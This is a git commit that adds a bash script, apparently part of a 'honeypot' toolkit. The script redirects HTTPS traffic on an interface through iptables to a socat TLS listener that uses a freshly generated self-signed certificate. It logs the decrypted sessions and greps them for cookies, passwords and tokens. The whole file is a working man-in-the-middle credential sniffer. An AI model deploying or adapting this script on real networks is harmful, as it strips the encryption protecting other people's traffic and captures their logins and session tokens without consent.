0a9aed56aab025204f4e95237f23044d2a67f599
soupbone89 <217927327+soupbone89@users.noreply.github.com>
2026-02-09 13:44:57 +0200

    Fix formatting and minor improvements in sslsplit.sh

---
+++ honeypot/on_network/sslsplit.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+echo '[*] SSL splitting'
+
+[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 443) = '' ]] \
+&& {
+    iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 443 -j REDIRECT --to-ports 1080
+}
+
+[[ $(pgrep /usr/bin/soccat) = '' ]] && {
+    if [[ ! -s /tmp/key.pem -o ! -s /tmp/cert.pem -o ! -s /tmp/cert_key.pem ]]; then
+        openssl req -new -x509 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes -batch
+        cat /tmp/cert.pem /tmp/key.pem > /tmp/cert_key.pem
+    fi
+
+    #sslsplit -k /tmp/key.pem -c /tmp/cert.pem -l /tmp/con.log -L sslsplit.log -P autossl 0.0.0.0 1080 &
+    socat -v openssl-listen:1080,fork,cert=/tmp/cert_key.pem,cafile=/tmp/cert.pem,verify=0 open:sslsplit.log,creat,append 2> /dev/null &
+}
+
+tail -n 0 -f sslsplit.log | while read line
+do
+    if echo "$line" | grep -ai -e cookie -e passw -e token --color=auto; then
+        led yellow on 2> /dev/null
+    fi
+done
